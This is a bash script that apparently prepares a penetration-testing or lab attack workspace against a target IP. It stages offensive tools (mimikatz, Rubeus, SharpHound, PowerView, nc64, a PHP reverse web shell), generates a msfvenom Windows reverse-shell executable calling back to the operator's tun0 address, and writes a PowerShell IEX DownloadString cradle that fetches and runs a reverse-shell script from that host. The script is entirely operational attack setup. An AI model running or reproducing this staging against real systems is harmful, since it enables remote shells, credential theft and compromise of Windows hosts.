#!/bin/bash

echo "Enter the target IP Address : "
read target_ip
mkdir -p nmap www exploit research autorecon templates
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 www
cp /opt/AD/PowerView.ps1 www
cp /usr/share/seclists/Web-Shells/laudanum-1.0/php/php-windows-reverse.php www
cp /opt/priv/winpeas/winPEASany.exe www
cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 www
cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 www
cp /usr/share/powershell-empire/empire/server/data/module_source/privesc/Sherlock.ps1 www
cp /opt/winready/agent.exe www
cp /opt/winready/proxy www
cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe www
cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 www
cp /opt/kerbrute/kerbrute_linux_amd64 research
cp /usr/share/windows-resources/binaries/nc64.exe www
cp /opt/winready/mimikatz.exe www
cp /opt/AD/PowerSploit/Recon/PowerView.ps1 www
cp /opt/winready/Rubeus.exe www


if [ ! -e notes.md ]; then
    touch notes.md
    ip_tun0=$(sh -c 'ip a | awk "/tun0\$/{gsub(/\/.*/, \"\"); print \$2}"')
    echo -e "MY IP = $ip_tun0" >> notes.md
    echo -e "Target = $target_ip" >> notes.md
    echo -e "$target_ip" > /target/target
    reverse -p 9001 >> research/rev.out
    msfvenom -p windows/shell_reverse_tcp LHOST=$ip_tun0 LPORT=9001 -f exe -o www/shell.exe > /dev/null 2>&1
    echo "Invoke-PowerShellTcp -Reverse -IPAddress ${ip_tun0} -Port 9001" >> www/Invoke-PowerShellTcp.ps1
    cp www/Invoke-PowerShellTcp.ps1 www/rev.ps1
    echo "IEX(New-Object Net.Webclient).DownloadString(\"http://${ip_tun0}:8000/rev.ps1\")" >> www/cradle
    subl $(pwd)
fi

TEMPLATE_PATH=/home/kali/Desktop/_templates/template.ctd
CT_FILE=templates/notes.ctd

if [ -f "$TEMPLATE_PATH" ]; then
    cp "$TEMPLATE_PATH" "$CT_FILE"
    setsid cherrytree -S "$CT_FILE" > /dev/null 2>&1 < /dev/null &
else
    echo "Template not found at $TEMPLATE_PATH"
fi
